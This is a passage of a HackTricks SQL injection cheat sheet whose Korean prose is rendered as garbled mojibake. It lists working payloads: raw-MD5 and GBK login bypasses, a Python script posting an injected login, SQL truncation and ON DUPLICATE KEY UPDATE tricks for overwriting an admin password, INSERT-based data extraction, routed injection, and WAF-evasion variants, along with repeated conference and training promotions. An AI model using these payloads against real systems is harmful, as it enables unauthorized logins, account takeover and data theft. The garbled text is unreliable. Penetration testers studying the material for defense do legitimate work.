ë˜í•œ **MySQL, PostgreSQL, Oracle, MSSQL, SQLite ë° HQLì— ê´€í•œ ë§ì€ íŠ¸ë¦­ì„** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.



<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)ì€ **ìŠ¤í˜ì¸**ì—ì„œ ê°€ì¥ ê´€ë ¨ì„±ì´ ë†’ì€ ì‚¬ì´ë²„ ë³´ì•ˆ ì´ë²¤íŠ¸ì´ë©° **ìœ ëŸ½**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ í–‰ì‚¬ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **ê¸°ìˆ  ì§€ì‹ì„ ì´‰ì§„í•˜ëŠ” ì„ë¬´**ë¥¼ ê°€ì§€ê³  ì´ ì»¨ê·¸ë ˆìŠ¤ëŠ” ëª¨ë“  ë¶„ì•¼ì˜ ê¸°ìˆ  ë° ì‚¬ì´ë²„ ë³´ì•ˆ ì „ë¬¸ê°€ë“¤ì´ ëª¨ì´ëŠ” ëœ¨ê±°ìš´ ë§Œë‚¨ì˜ ì¥ì†Œì…ë‹ˆë‹¤.

{% embed url="https://www.rootedcon.com/" %}

## ì¸ì¦ ìš°íšŒ

ë¡œê·¸ì¸ ê¸°ëŠ¥ì„ ìš°íšŒí•˜ê¸° ìœ„í•´ ì‹œë„í•  ëª©ë¡:

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### ì›ì‹œ í•´ì‹œ ì¸ì¦ ìš°íšŒ
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
ì´ ì¿¼ë¦¬ëŠ” ì¸ì¦ ê²€ì‚¬ì—ì„œ ì›ì‹œ ì¶œë ¥ì„ ìœ„í•´ trueë¡œ MD5ë¥¼ ì‚¬ìš©í•  ë•Œ ë°œìƒí•˜ëŠ” ì·¨ì•½ì ì„ ë³´ì—¬ì¤ë‹ˆë‹¤. ì´ë¡œ ì¸í•´ ì‹œìŠ¤í…œì´ SQL ì¸ì ì…˜ì— ì·¨ì•½í•´ì§‘ë‹ˆë‹¤. ê³µê²©ìëŠ” í•´ì‹œë  ë•Œ ì˜ˆìƒì¹˜ ëª»í•œ SQL ëª…ë ¹ ë¶€ë¶„ì„ ìƒì„±í•˜ëŠ” ì…ë ¥ì„ ì¡°ì‘í•˜ì—¬ ì´ë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìœ¼ë©°, ì´ë¡œ ì¸í•´ ë¬´ë‹¨ ì ‘ê·¼ì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```sql
md5("ffifdyop", true) = 'or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½bï¿½
sha1("3fDf ", true) = Qï¿½u'='ï¿½@ï¿½[ï¿½tï¿½- oï¿½ï¿½_-!
```
### ì£¼ì…ëœ í•´ì‹œ ì¸ì¦ ìš°íšŒ
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**ì¶”ì²œ ëª©ë¡**:

ê° ì¤„ì˜ ëª©ë¡ì„ ì‚¬ìš©ì ì´ë¦„ìœ¼ë¡œ ì‚¬ìš©í•˜ê³  ë¹„ë°€ë²ˆí˜¸ëŠ” í•­ìƒ: _**Pass1234.**_\
_(ì´ í˜ì´ë¡œë“œëŠ” ì´ ì„¹ì…˜ì˜ ì‹œì‘ ë¶€ë¶„ì— ì–¸ê¸‰ëœ í° ëª©ë¡ì—ë„ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤)_

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### GBK ì¸ì¦ ìš°íšŒ

IF 'ê°€ ì´ìŠ¤ì¼€ì´í”„ë˜ê³  ìˆë‹¤ë©´ %A8%27ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìœ¼ë©°, 'ê°€ ì´ìŠ¤ì¼€ì´í”„ë˜ë©´ ë‹¤ìŒì´ ìƒì„±ë©ë‹ˆë‹¤: 0xA80x5c0x27 (_â•˜'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
íŒŒì´ì¬ ìŠ¤í¬ë¦½íŠ¸:
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### ë‹¤ì¤‘ ì»¨í…ìŠ¤íŠ¸ ì£¼ì… (Polyglot injection)
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## Insert Statement

### ê¸°ì¡´ ê°ì²´/ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ ìˆ˜ì •

ì´ë¥¼ ìœ„í•´ **"ë§ˆìŠ¤í„° ê°ì²´"**ë¼ëŠ” ì´ë¦„ì˜ ìƒˆ ê°ì²´ë¥¼ **ìƒì„±**í•˜ë ¤ê³  ì‹œë„í•´ì•¼ í•©ë‹ˆë‹¤(ì‚¬ìš©ìì˜ ê²½ìš° **admin**ì¼ ê°€ëŠ¥ì„±ì´ ë†’ìŠµë‹ˆë‹¤) ë­”ê°€ë¥¼ ìˆ˜ì •í•˜ì—¬:

* ì´ë¦„ì´ **AdMIn**ì¸ ì‚¬ìš©ì ìƒì„± (ëŒ€ë¬¸ì ë° ì†Œë¬¸ì í˜¼í•©)
* ì´ë¦„ì´ **admin=**ì¸ ì‚¬ìš©ì ìƒì„±
* **SQL Truncation Attack** (ì‚¬ìš©ì ì´ë¦„ì´ë‚˜ ì´ë©”ì¼ì— **ê¸¸ì´ ì œí•œ**ì´ ìˆì„ ë•Œ) --> ì´ë¦„ì´ **admin \[ê³µë°± ë§ì´] a**ì¸ ì‚¬ìš©ì ìƒì„±

#### SQL Truncation Attack

ë°ì´í„°ë² ì´ìŠ¤ê°€ ì·¨ì•½í•˜ê³  ì‚¬ìš©ì ì´ë¦„ì˜ ìµœëŒ€ ë¬¸ì ìˆ˜ê°€ ì˜ˆë¥¼ ë“¤ì–´ 30ì¼ ë•Œ, **admin** ì‚¬ìš©ìë¥¼ ê°€ì¥í•˜ê³  ì‹¶ë‹¤ë©´: "_admin \[30 ê³µë°±] a_"ë¼ëŠ” ì‚¬ìš©ì ì´ë¦„ì„ ìƒì„±í•´ ë³´ì‹­ì‹œì˜¤. ê·¸ë¦¬ê³  ì•„ë¬´ ë¹„ë°€ë²ˆí˜¸ë‚˜ ì…ë ¥í•©ë‹ˆë‹¤.

ë°ì´í„°ë² ì´ìŠ¤ëŠ” ì…ë ¥ëœ **ì‚¬ìš©ì ì´ë¦„**ì´ ë°ì´í„°ë² ì´ìŠ¤ì— **ì¡´ì¬í•˜ëŠ”ì§€** **í™•ì¸**í•©ë‹ˆë‹¤. **ì¡´ì¬í•˜ì§€ ì•Šìœ¼ë©´**, **ì‚¬ìš©ì ì´ë¦„**ì„ **í—ˆìš©ëœ ìµœëŒ€ ë¬¸ì ìˆ˜**ë¡œ **ì˜ë¼ëƒ…ë‹ˆë‹¤** (ì´ ê²½ìš° "_admin \[25 ê³µë°±]_"ë¡œ) ê·¸ë¦¬ê³  ë°ì´í„°ë² ì´ìŠ¤ ë‚´ì—ì„œ ì‚¬ìš©ì "**admin**"ì˜ **ìƒˆ ë¹„ë°€ë²ˆí˜¸**ë¡œ **ìë™ìœ¼ë¡œ ëª¨ë“  ê³µë°±ì„ ì œê±°**í•©ë‹ˆë‹¤ (ì–´ë–¤ ì˜¤ë¥˜ê°€ ë°œìƒí•  ìˆ˜ ìˆì§€ë§Œ, ì´ê²ƒì´ ì‘ë™í•˜ì§€ ì•Šì•˜ë‹¤ëŠ” ì˜ë¯¸ëŠ” ì•„ë‹™ë‹ˆë‹¤).

ìì„¸í•œ ì •ë³´: [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_ì°¸ê³ : ì´ ê³µê²©ì€ ìµœì‹  MySQL ì„¤ì¹˜ì—ì„œ ìœ„ì™€ ê°™ì´ ë” ì´ìƒ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë¹„êµëŠ” ì—¬ì „íˆ ê¸°ë³¸ì ìœ¼ë¡œ í›„í–‰ ê³µë°±ì„ ë¬´ì‹œí•˜ì§€ë§Œ, í•„ë“œì˜ ê¸¸ì´ë³´ë‹¤ ê¸´ ë¬¸ìì—´ì„ ì‚½ì…í•˜ë ¤ê³  í•˜ë©´ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ê³  ì‚½ì…ì´ ì‹¤íŒ¨í•©ë‹ˆë‹¤. ì´ ì ì— ëŒ€í•œ ë” ë§ì€ ì •ë³´ëŠ” ë‹¤ìŒì„ í™•ì¸í•˜ì‹­ì‹œì˜¤: [https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)_

### MySQL Insert ì‹œê°„ ê¸°ë°˜ ê²€ì‚¬

VALUES ë¬¸ì„ ì¢…ë£Œí•˜ê¸° ìœ„í•´ í•„ìš”í•œ ë§Œí¼ `','',''`ë¥¼ ì¶”ê°€í•˜ì‹­ì‹œì˜¤. ì§€ì—°ì´ ë°œìƒí•˜ë©´ SQLInjectionì´ ìˆëŠ” ê²ƒì…ë‹ˆë‹¤.
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

MySQLì˜ `ON DUPLICATE KEY UPDATE` ì ˆì€ UNIQUE ì¸ë±ìŠ¤ ë˜ëŠ” PRIMARY KEYì—ì„œ ì¤‘ë³µ ê°’ì´ ë°œìƒí•˜ëŠ” í–‰ì„ ì‚½ì…í•˜ë ¤ê³  í•  ë•Œ ë°ì´í„°ë² ì´ìŠ¤ê°€ ìˆ˜í–‰í•  ì‘ì—…ì„ ì§€ì •í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ë‹¤ìŒ ì˜ˆì œëŠ” ì´ ê¸°ëŠ¥ì´ ê´€ë¦¬ìì˜ ê³„ì • ë¹„ë°€ë²ˆí˜¸ë¥¼ ìˆ˜ì •í•˜ëŠ” ë° ì–´ë–»ê²Œ ì•…ìš©ë  ìˆ˜ ìˆëŠ”ì§€ë¥¼ ë³´ì—¬ì¤ë‹ˆë‹¤:

Example Payload Injection:

ì£¼ì… í˜ì´ë¡œë“œëŠ” ë‹¤ìŒê³¼ ê°™ì´ ì‘ì„±ë  ìˆ˜ ìˆìœ¼ë©°, ë‘ ê°œì˜ í–‰ì´ `users` í…Œì´ë¸”ì— ì‚½ì…ë˜ë ¤ê³  ì‹œë„ë©ë‹ˆë‹¤. ì²« ë²ˆì§¸ í–‰ì€ ë¯¸ë¼ì´ê³ , ë‘ ë²ˆì§¸ í–‰ì€ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì—…ë°ì´íŠ¸í•  ì˜ë„ë¡œ ê¸°ì¡´ ê´€ë¦¬ìì˜ ì´ë©”ì¼ì„ ëŒ€ìƒìœ¼ë¡œ í•©ë‹ˆë‹¤:
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
Here's how it works:

- ì¿¼ë¦¬ëŠ” ë‘ ê°œì˜ í–‰ì„ ì‚½ì…í•˜ë ¤ê³  ì‹œë„í•©ë‹ˆë‹¤: í•˜ë‚˜ëŠ” `generic_user@example.com`ì„ ìœ„í•œ ê²ƒì´ê³ , ë‹¤ë¥¸ í•˜ë‚˜ëŠ” `admin_generic@example.com`ì„ ìœ„í•œ ê²ƒì…ë‹ˆë‹¤.
- ë§Œì•½ `admin_generic@example.com`ì— ëŒ€í•œ í–‰ì´ ì´ë¯¸ ì¡´ì¬í•œë‹¤ë©´, `ON DUPLICATE KEY UPDATE` ì ˆì´ íŠ¸ë¦¬ê±°ë˜ì–´ MySQLì— ê¸°ì¡´ í–‰ì˜ `password` í•„ë“œë¥¼ "bcrypt_hash_of_newpassword"ë¡œ ì—…ë°ì´íŠ¸í•˜ë„ë¡ ì§€ì‹œí•©ë‹ˆë‹¤.
- ê²°ê³¼ì ìœ¼ë¡œ, `admin_generic@example.com`ì„ ì‚¬ìš©í•˜ì—¬ bcrypt í•´ì‹œì— í•´ë‹¹í•˜ëŠ” ë¹„ë°€ë²ˆí˜¸ë¡œ ì¸ì¦ì„ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ ("bcrypt_hash_of_newpassword"ëŠ” ìƒˆ ë¹„ë°€ë²ˆí˜¸ì˜ bcrypt í•´ì‹œë¥¼ ë‚˜íƒ€ë‚´ë©°, ì›í•˜ëŠ” ë¹„ë°€ë²ˆí˜¸ì˜ ì‹¤ì œ í•´ì‹œë¡œ ëŒ€ì²´ë˜ì–´ì•¼ í•©ë‹ˆë‹¤).

### Extract information

#### Creating 2 accounts at the same time

ìƒˆ ì‚¬ìš©ìì™€ ì‚¬ìš©ì ì´ë¦„ì„ ìƒì„±í•˜ë ¤ê³  í•  ë•Œ, ë¹„ë°€ë²ˆí˜¸ì™€ ì´ë©”ì¼ì´ í•„ìš”í•©ë‹ˆë‹¤:
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### 10ì§„ìˆ˜ ë˜ëŠ” 16ì§„ìˆ˜ ì‚¬ìš©

ì´ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ë©´ 1ê°œì˜ ê³„ì •ë§Œ ìƒì„±í•˜ì—¬ ì •ë³´ë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì£¼ì˜í•  ì ì€ ì•„ë¬´ê²ƒë„ ì£¼ì„ ì²˜ë¦¬í•  í•„ìš”ê°€ ì—†ë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤.

**hex2dec** ë° **substr** ì‚¬ìš©:
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
í…ìŠ¤íŠ¸ë¥¼ ì–»ìœ¼ë ¤ë©´ ë‹¤ìŒì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
**hex**ì™€ **replace** (ê·¸ë¦¬ê³  **substr**) ì‚¬ìš©:
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)ì€ **ìŠ¤í˜ì¸**ì—ì„œ ê°€ì¥ ê´€ë ¨ì„±ì´ ë†’ì€ ì‚¬ì´ë²„ ë³´ì•ˆ ì´ë²¤íŠ¸ì´ë©° **ìœ ëŸ½**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ í–‰ì‚¬ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **ê¸°ìˆ  ì§€ì‹ì„ ì´‰ì§„í•˜ëŠ” ì„ë¬´**ë¥¼ ê°€ì§€ê³ , ì´ ì»¨ê·¸ë ˆìŠ¤ëŠ” ëª¨ë“  ë¶„ì•¼ì˜ ê¸°ìˆ  ë° ì‚¬ì´ë²„ ë³´ì•ˆ ì „ë¬¸ê°€ë“¤ì´ ëª¨ì´ëŠ” ëœ¨ê±°ìš´ ë§Œë‚¨ì˜ ì¥ì†Œì…ë‹ˆë‹¤.

{% embed url="https://www.rootedcon.com/" %}

## Routed SQL injection

Routed SQL injectionì€ ì£¼ì… ê°€ëŠ¥í•œ ì¿¼ë¦¬ê°€ ì¶œë ¥ì„ ì œê³µí•˜ëŠ” ê²ƒì´ ì•„ë‹ˆë¼, ì£¼ì… ê°€ëŠ¥í•œ ì¿¼ë¦¬ì˜ ì¶œë ¥ì´ ì¶œë ¥ì„ ì œê³µí•˜ëŠ” ì¿¼ë¦¬ë¡œ ì „ë‹¬ë˜ëŠ” ìƒí™©ì…ë‹ˆë‹¤. ([From Paper](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

Example:
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## WAF ìš°íšŒ

[ì´ˆê¸° ìš°íšŒëŠ” ì—¬ê¸°ì—ì„œ](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### ê³µë°± ì—†ëŠ” ìš°íšŒ

No Space (%20) - ê³µë°± ëŒ€ì²´ë¥¼ ì‚¬ìš©í•œ ìš°íšŒ
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
No Whitespace - ì£¼ì„ì„ ì‚¬ìš©í•œ ìš°íšŒ
```sql
?id=1/*comment*/and/**/1=1/**/--
```
No Whitespace - ê´„í˜¸ë¥¼ ì‚¬ìš©í•œ ìš°íšŒ
```sql
?id=(1)and(1)=(1)--
```
### No commas bypass

No Comma - OFFSET, FROM ë° JOINì„ ì‚¬ìš©í•œ ìš°íšŒ
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### Generic Bypasses

í‚¤ì›Œë“œë¥¼ ì‚¬ìš©í•œ ë¸”ë™ë¦¬ìŠ¤íŠ¸ - ëŒ€ë¬¸ì/ì†Œë¬¸ìë¥¼ ì‚¬ìš©í•˜ì—¬ ìš°íšŒ
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
ëŒ€ì†Œë¬¸ì êµ¬ë¶„ ì—†ëŠ” í‚¤ì›Œë“œë¥¼ ì‚¬ìš©í•œ ë¸”ë™ë¦¬ìŠ¤íŠ¸ - ë™ë“±í•œ ì—°ì‚°ìë¥¼ ì‚¬ìš©í•˜ì—¬ ìš°íšŒ
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### Scientific Notation WAF ìš°íšŒ

You can find a more in depth explaination of this trick in [gosecure blog](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/).\
ê¸°ë³¸ì ìœ¼ë¡œ WAFë¥¼ ìš°íšŒí•˜ê¸° ìœ„í•´ ì˜ˆìƒì¹˜ ëª»í•œ ë°©ì‹ìœ¼ë¡œ ê³¼í•™ì  í‘œê¸°ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### ì—´ ì´ë¦„ ì œí•œ ìš°íšŒ

ë¨¼ì €, **ì›ë˜ ì¿¼ë¦¬ì™€ í”Œë˜ê·¸ë¥¼ ì¶”ì¶œí•˜ë ¤ëŠ” í…Œì´ë¸”ì˜ ì—´ ìˆ˜ê°€ ë™ì¼í•˜ë‹¤ë©´** ë‹¤ìŒê³¼ ê°™ì´ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: `0 UNION SELECT * FROM flag`

**ì—´ ì´ë¦„ì„ ì‚¬ìš©í•˜ì§€ ì•Šê³  í…Œì´ë¸”ì˜ ì„¸ ë²ˆì§¸ ì—´ì— ì ‘ê·¼í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤** ë‹¤ìŒê³¼ ê°™ì€ ì¿¼ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, ë”°ë¼ì„œ sqlinjectionì—ì„œëŠ” ë‹¤ìŒê³¼ ê°™ì´ ë³´ì¼ ê²ƒì…ë‹ˆë‹¤:
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
ë˜ëŠ” **comma bypass**ë¥¼ ì‚¬ìš©í•˜ì—¬:
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
ì´ íŠ¸ë¦­ì€ [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)ì—ì„œ ê°€ì ¸ì™”ìŠµë‹ˆë‹¤.

### WAF ìš°íšŒ ì œì•ˆ ë„êµ¬

{% embed url="https://github.com/m4ll0k/Atlas" %}

## ê¸°íƒ€ ê°€ì´ë“œ

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## ë¸Œë£¨íŠ¸í¬ìŠ¤ íƒì§€ ëª©ë¡

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}



â€‹

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)ì€ **ìŠ¤í˜ì¸**ì—ì„œ ê°€ì¥ ê´€ë ¨ì„±ì´ ë†’ì€ ì‚¬ì´ë²„ ë³´ì•ˆ ì´ë²¤íŠ¸ì´ë©° **ìœ ëŸ½**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ í–‰ì‚¬ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **ê¸°ìˆ  ì§€ì‹ì„ ì´‰ì§„í•˜ëŠ” ì„ë¬´**ë¥¼ ê°€ì§€ê³  ìˆëŠ” ì´ íšŒì˜ëŠ” ëª¨ë“  ë¶„ì•¼ì˜ ê¸°ìˆ  ë° ì‚¬ì´ë²„ ë³´ì•ˆ ì „ë¬¸ê°€ë“¤ì´ ëª¨ì´ëŠ” ëœ¨ê±°ìš´ ë§Œë‚¨ì˜ ì¥ì†Œì…ë‹ˆë‹¤.

{% embed url="https://www.rootedcon.com/" %}

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
